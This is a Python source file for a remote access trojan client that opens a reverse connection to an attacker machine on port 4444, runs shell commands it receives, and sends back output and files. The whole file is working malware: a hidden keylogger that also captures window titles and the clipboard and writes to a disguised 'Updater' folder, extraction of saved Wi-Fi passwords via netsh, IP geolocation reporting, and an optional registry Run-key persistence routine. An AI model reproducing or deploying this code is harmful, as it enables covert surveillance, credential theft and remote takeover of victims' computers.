import shutil
import datetime
import pyttsx3
import time
import win32gui
import re
import sys
import requests
import os
import socket
import subprocess
import getpass
import json
import threading
import time
from typing import final
from datetime import date
from tkinter import TclError, Tk
from urllib.request import urlopen
from pynput import keyboard
from requests.models import Response
from requests.sessions import PreparedRequest
from subprocess import check_output
from subprocess import DEVNULL
from subprocess import call


# Set this variable to the attack computers private IP address
# Instructions for this can be found in the README.md file
set_private_ip = ""

def imports():
    try:
        import datetime
    except ModuleNotFoundError:
        alr = subprocess.check_output(
            "pip install datetime", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import datetime
        import time

    try:
        import pynput
    except ModuleNotFoundError:
        alr = subprocess.check_output(
            "pip install pynput", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import pynput

    try:
        import keyboard
    except ModuleNotFoundError:
        alr = subprocess.check_output(
            "pip install keyboard", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import keyboard

    try:
        import pyttsx3
    except ModuleNotFoundError:
        alr = subprocess.check_output(
            "pip install pyttsx3", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import pyttsx3
    try:
        import requests
    except ModuleNotFoundError:
        alr = subprocess.check_output(
            "pip install requests", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import requests


imports()


time.sleep(.1)


def start_keylogger():
    global window_log
    global keys_pressed
    global current_window_logs
    global clipboard_log
    global all_clips
    window_log = []
    keys_pressed = []
    current_window_logs = []
    clipboard_log = []
    all_clips = []

    def establish_dir():
        global main_dir_path
        main_dir_path = "C:\\Users\\" + getpass.getuser() + "\\Updater"
        if os.path.isfile(main_dir_path+"\\updateDDDMA.txt") == False:
            if os.path.exists(main_dir_path) == False:
                os.mkdir(main_dir_path)
            with open(main_dir_path+"\\updateDDDMA.txt", "w") as e:
                print("made1")
                e.close()

    # def subprocess_commands():
    #     os.system("pip install requests")  # installing modules
    #     os.system("pip install pynput")
    #     os.system("pip install pywin32")
    #     # I made this a thread because if this already exists in the startup, it will ask you for an input to override it. The user obviously can't answer the input.

    # subprocess_commands()

    def log_window():
        # This feature will only be available if the client machine is on windows
        try:
            the_current_window = str(win32gui.GetWindowText(
                win32gui.GetForegroundWindow()))
            if the_current_window == current_window_logs[-1] or the_current_window == "":
                pass
            else:
                current_window = win32gui.GetWindowText(
                    win32gui.GetForegroundWindow())
                current_window_logs.append(current_window)
                username = getpass.getuser()
                today = date.today()
                current_date = today.strftime('%m/%d/%y')
                current_time = time.strftime("%I:%M:%S %p")
                date_and_window = f'On {current_date} at {current_time}, the user "{username}", was at "{current_window}"'

                window_log.append(date_and_window)
        except IndexError:
            print("WAITTTTTTTTTTTTTTTT")

            current_window = win32gui.GetWindowText(
                win32gui.GetForegroundWindow())
            print(current_window)
            current_window_logs.append(current_window)
            username = getpass.getuser()
            today = date.today()
            current_date = today.strftime('%m/%d/%y')
            current_time = time.strftime("%I:%M:%S %p")
            date_and_window = f'On {current_date} at {current_time}, the user "{username}", was at "{current_window}"'
            window_log.append(date_and_window)

    def clipboard_logger():
        global all_clips
        try:
            try:
                clipboard_data = Tk().clipboard_get()
            except TclError:
                clipboard_data = ''
                # This means that nothing is copied to their clipboard

            # print(
            #     f'clip data: {clipboard_data}\n\nall clips -2: {all_clips[-1]}')
            if clipboard_data == all_clips[-1]:
                pass
            else:
                username = getpass.getuser()
                today = date.today()
                current_date = today.strftime('%m/%d/%y')
                current_time = time.strftime("%I:%M:%S %p")
                date_and_clip = f'On {current_date} at {current_time}, the user "{username}", copied: {clipboard_data}"'
                clipboard_log.append(date_and_clip)
            all_clips.append(clipboard_data)
        except IndexError:
            all_clips.append(clipboard_data)
        except TclError:
            pass

    def keylogger():
        def check_keys():
            # The amount of seconds it takes to check the amount of keys pressed
            time_to_check_keys = 5
            # The amount of keys that need to be pressed to send the email
            amount_of_keys_to_be_pressed = 20

            time.sleep(time_to_check_keys)
            key_count_checker = []
            for i in keys_pressed:
                key_count_checker.append('s')
            if len(key_count_checker) < amount_of_keys_to_be_pressed:
                pass
            else:
                finish_and_write_info()

        def thread_to_start_check_keys():
            while logger_enabled:
                time.sleep(.5)
                check_keys()

        def thread_for_window_logger():
            while logger_enabled:
                time.sleep(.5)
                log_window()

        def thread_for_clip_logger():
            while logger_enabled:
                time.sleep(.5)
                clipboard_logger()

        def listen():
            def on_press(key):
                global keys_pressed
                if logger_enabled:
                    try:
                        if 'Key.' in str(key.char):
                            sub = str(key.char).split('Key.')[1]
                            if sub != 'space':
                                keys_pressed.append(f' [{sub}] ')
                            else:
                                keys_pressed.append(f' ')
                        else:
                            keys_pressed.append(str(key.char))
                    except AttributeError:
                        if 'Key.' in str(key):
                            sub = str(key).split('Key.')[1]
                            if sub != 'space':
                                keys_pressed.append(f' [{sub}] ')
                            else:
                                keys_pressed.append(f' ')
                        else:
                            keys_pressed.append(str(key))
                else:
                    return False
            with keyboard.Listener(
                    on_press=on_press) as listener:
                listener.join()

        threading.Thread(target=thread_to_start_check_keys).start()
        threading.Thread(target=thread_for_window_logger).start()
        threading.Thread(target=thread_for_clip_logger).start()
        listen()

    def finish_and_write_info():
        global clipboard_log
        global final_target_info
        global keys_pressed_to_send
        global window_log_to_send
        global clipboard_log_to_send
        global window_log
        global keys_pressed
        global all_clips

        def get_target_info():
            global final_target_info
            global window_log_to_send
            global keys_pressed_to_send
            global clipboard_log_to_send

            public_ip = requests.get('https://api.ipify.org').text
            private_ip = socket.gethostbyname(socket.gethostname())

            def get_location():
                url = 'http://ipinfo.io/json'
                response = urlopen(url)
                data = json.load(response)

                ip = data['ip']
                provider = data['org']
                city = data['city']
                country = data['country']
                state = data['region']
                location = f'Country: {country}\nState: {state}\nCity: {city}\nProvider: {provider}'

                return location

            window_log_to_send = '\n'.join(window_log)
            keys_pressed_to_send = ''.join(keys_pressed)
            clipboard_log_to_send = '\n'.join(clipboard_log)
            final_target_info = f'\n\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\n\n{get_location()}\n\nWindow Log:\n{window_log_to_send}\n\nClipboard Log:\n{clipboard_log_to_send}\n\nKeys pressed: {keys_pressed_to_send}'
            # final_target_info = f'\n\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\n\n{get_location()}\n\nClipboard Log:\n{clipboard_log_to_send}\n\nKeys pressed: {keys_pressed_to_send}'
            keys_pressed_to_send = ''
            window_log_to_send = ''
            clipboard_log_to_send = ''

        get_target_info()
        print(final_target_info)
        try:
            with open(main_dir_path+"\\updateDDDMA.txt", "a", encoding="utf-8") as file:
                file.write(
                    f"\n${final_target_info}\n----------------------------------------------------------------------")
                print("made2")
                file.close()
        except FileNotFoundError:
            establish_dir()
            time.sleep(2)
            with open(main_dir_path+"\\updateDDDMA.txt", "a", encoding="utf-8") as file:
                file.write(
                    f"\n${final_target_info}\n----------------------------------------------------------------------")
                print("made3")
                file.close()
        window_log = []
        keys_pressed = []
        clipboard_log = []
        all_clips = []
        final_target_info = ''
        keys_pressed_to_send = ''
        window_log_to_send = ''
        clipboard_log_to_send = ''

    establish_dir()
    keylogger()

logger_enabled = False

if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
    logger_enabled = True
    print("KEYSTART")
    # Attacker has enabled keylogger on this machine before
    threading.Thread(target=start_keylogger).start()
else:
    print("KEY NO START")
engine = pyttsx3.init()
voices = engine.getProperty('voices')
engine.setProperty('rate', 200)
engine.setProperty('voice', voices[1].id)
engine.runAndWait()


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    time.sleep(3)
    try:
        connection.connect((set_private_ip, 4444))
        break
    except Exception as e:
        print(e)


oss = sys.platform
passwd = "Test"
logsuc = "[+] Login Successful"
logfail = "Incorrect"
something = "something"
cd_check = 0
invalid_dir = "Invalid Directory"
has_ben_defed = 0
###############################


def login():
    while True:
        lr = str(connection.recv(1024), "utf-8")
        if lr == passwd:
            connection.send(str.encode(logsuc))
            connection.send(str.encode(json.dumps(
                [oss, getpass.getuser(), requests.get('https://api.ipify.org/').text])))
            break
        elif lr != passwd:
            connection.send(str.encode(logfail))


def start_up():
    file_location = os.environ["appdata" + "\\WINDOWS'.exe"]
    if not os.path.exists(file_location):
        shutil.copyfile(sys.executable, file_location)
        subprocess.call(
            'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)





def run_commands():
    global has_ben_defed
    global connection
    global logger_enabled
    try:
        while True:
            data = connection.recv(1024)
            if 'cd' not in data[:].decode("utf-8").lower():
                cmd = subprocess.Popen(data[:].decode(
                    "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                has_ben_defed = 1
            data_d = data[:].decode("utf-8")
            Directory = re.match("(?:cd) (.*)", data_d)
            print(data[:].decode("utf-8").lower().strip())
            ldata = data[:].decode("utf-8").lower().strip()
            print("LDATA: " + ldata)
            if "speak " in ldata:
                ogl = 0
                xy = 8
                xyz = 0
                while xy == 8:
                    try:
                        d_data = data[:].decode("utf-8").lower()
                        d_data = str(d_data)
                        d_data_split = d_data.split()
                        ll = len(d_data_split)
                        ogl += 1
                        pyttsx3.speak(d_data_split[int(ogl)])
                    except IndexError:
                        run_commands()
            elif ldata == "clipboard get":
                print("recived command for clipboard")
                if "win" in oss:
                    clipboard_content = subprocess.check_output(
                        "powershell get-clipboard", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    connection.send(str.encode(str(clipboard_content)))
                elif "mac" in oss:
                    clipboard_content = subprocess.check_output(
                        "pbpaste", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    connection.send(str.encode(str(clipboard_content)))
                else:
                    connection.send(str.encode(
                        "Sorry, but this command is only available for windows and mac os"))
            elif ldata == "keylogger start":
                print("Start command recieved")
                if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
                    connection.send(str.encode("exists"))
                else:
                    connection.send(str.encode("started"))
                    logger_enabled = True
                    start_keylogger()
            elif ldata == "keylogger get":
                print("Get command recieved")
                if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt") == False:
                    connection.send(str.encode("nan"))
                else:
                    with open("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt", "r") as file:
                        connection.send(str.encode(file.read()))
                        file.close()
            elif ldata == "keylogger end":
                print("End command recieved")
                if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt") == False:
                    connection.send(str.encode("nan"))
                else:
                    connection.send(str.encode("ending"))
                    logger_enabled = False
                    shutil.rmtree("C:\\Users\\" + getpass.getuser() + "\\Updater", ignore_errors=True)
            elif ldata == "wifipass" or ldata == "wifi pass":
                pn = 0
                while True:
                    try:
                        show_profile = subprocess.check_output(
                            "netsh wlan show profile", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        regex_name = re.findall(
                            "(?:All User Profile\s*:\s)(.*)", show_profile.decode())
                        tarwifi = regex_name[pn]
                        pn += 1
                        getp = subprocess.check_output(
                            "netsh wlan show profile " + tarwifi + " key=clear", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        wifip = re.search(
                            "(?:Key Content\s*:\s)(.*)", getp.decode())
                        connection.send(str.encode(str(wifip)))
                    except IndexError:
                        connection.send(str.encode(str(something)))
                        break

            elif "pubip" not in ldata and "wifipass" not in ldata and "wifi pass" not in ldata:
                if ldata != "download" and "cd " not in ldata and "cd.." not in ldata and has_ben_defed == 1:
                    connection.send(str.encode(
                        str(output_str) + str(os.getcwd()) + '> '))

                elif Directory and ldata != "cd.." and ldata != "cd ..":
                    try:
                        chosen_dir = Directory.group(1)
                        os.chdir(str(chosen_dir))
                        chosen_dir = "Directory has successfully been changed to " + chosen_dir
                        connection.send(str.encode(str(chosen_dir)))
                    except FileNotFoundError:
                        connection.send(str.encode(str(invalid_dir)))

                elif ldata == 'cd' or ldata == 'cd ':
                    my_cwd = os.getcwd()
                    connection.send(str.encode(str(my_cwd)))

                elif ldata == 'cd..' or ldata == 'cd ..':
                    try:
                        os.chdir("..")
                        cd_output = "You have successfully went back one directory"
                        connection.send(str.encode(str(cd_output)))
                    except FileNotFoundError:
                        connection.send(str.encode(str(invalid_dir)))
                else:
                    path = connection.recv(1024)
                    path = str(path.decode())
                    with open(path, "rb") as file:
                        file_content = str(file.read())
                    connection.send(str.encode(str(file_content)))

            elif "pubip" in ldata:
                publicIP = requests.get('https://api.ipify.org/').text
                connection.send(str.encode(publicIP))
            
    except Exception as e:
        # sys.exit()
        # If we uncomment the line above, you will no longer be able to connect to the client computer after the connection ends (until the file is relaunched)
        print(e)
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            time.sleep(3)
            try:
                connection.connect((set_private_ip, 4444))
                break
            except Exception as e:
                print(e)
        login()
        run_commands()


# start_up()
# If you uncomment the line above, the file will be added to the startup directory to that the client will start up everytime the computer turns on
login()
run_commands()



